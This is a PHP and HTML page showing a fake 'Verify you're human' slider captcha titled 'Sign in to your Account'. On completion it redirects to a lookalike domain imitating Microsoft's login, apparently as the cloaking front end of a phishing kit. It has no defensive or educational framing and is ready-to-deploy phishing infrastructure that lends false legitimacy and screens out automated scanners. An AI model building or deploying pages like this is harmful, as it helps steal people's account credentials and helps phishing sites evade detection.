<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['verified'] = true;

    // Change this to your original website
    header('Location: https://login-microsoftonlineaccountlive-com.onrender.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon.png">
    <title>Sign in to your Account</title>

    <style>
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .box {
            width: 350px;
            padding: 30px;
            background: white;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 5px 25px rgba(0,0,0,.1);
        }

        .slider {
            position: relative;
            height: 55px;
            margin-top: 25px;
            background: #e5e5e5;
            border-radius: 30px;
            overflow: hidden;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            line-height: 55px;
            color: #777;
            pointer-events: none;
        }

        .handle {
            position: absolute;
            left: 0;
            top: 0;
            width: 55px;
            height: 55px;
            border-radius: 50%;
            border: none;
            background: #222;
            color: white;
            cursor: grab;
            font-size: 20px;
            z-index: 2;
        }

        .handle:active {
            cursor: grabbing;
        }
    </style>
</head>

<body>

<div class="box">
    <h2>Verify you're human</h2>
    <p>Slide the button to continue.</p>

    <form method="POST" id="verifyForm">
        <div class="slider" id="slider">
            <div class="slider-text">Slide to verify →</div>
            <button type="button" class="handle" id="handle">→</button>
        </div>
    </form>
</div>

<script>
const slider = document.getElementById("slider");
const handle = document.getElementById("handle");
const form = document.getElementById("verifyForm");

let dragging = false;

function move(x) {
    const rect = slider.getBoundingClientRect();

    let position = x - rect.left - handle.offsetWidth / 2;

    const max = slider.offsetWidth - handle.offsetWidth;

    position = Math.max(0, Math.min(position, max));

    handle.style.left = position + "px";

    if (position >= max - 2) {
        dragging = false;
        form.submit();
    }
}

handle.addEventListener("mousedown", () => {
    dragging = true;
});

document.addEventListener("mousemove", (e) => {
    if (dragging) {
        move(e.clientX);
    }
});

document.addEventListener("mouseup", () => {
    dragging = false;
});

handle.addEventListener("touchstart", () => {
    dragging = true;
}, { passive: true });

document.addEventListener("touchmove", (e) => {
    if (dragging) {
        move(e.touches[0].clientX);
    }
}, { passive: true });

document.addEventListener("touchend", () => {
    dragging = false;
});
</script>

</body>
</html>
